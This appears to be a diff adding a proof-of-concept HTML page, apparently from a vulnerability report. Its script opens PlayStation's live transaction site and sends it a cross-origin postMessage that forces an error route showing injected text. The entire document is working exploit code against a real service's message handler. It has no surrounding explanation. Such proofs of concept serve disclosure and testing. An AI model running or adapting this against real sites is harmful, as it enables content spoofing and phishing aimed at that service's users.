@@ -1,0 +1,16 @@
+<html>
+  <head>
+    <title> Welcome </title>
+  </head>
+  <body>
+    <h1>Hello, Worlds!</h1>
+    <script>
+      win = window.open("https://transact.playstation.com/");
+      win.postMessage(JSON.stringify({
+        action: "replaceRoute",
+        route: "application_error",
+        model: { error: 500, title: "injected", message: "Welcomess, Perzon!!" }
+      }), "*");
+    </script>
+  </body>
+</html>
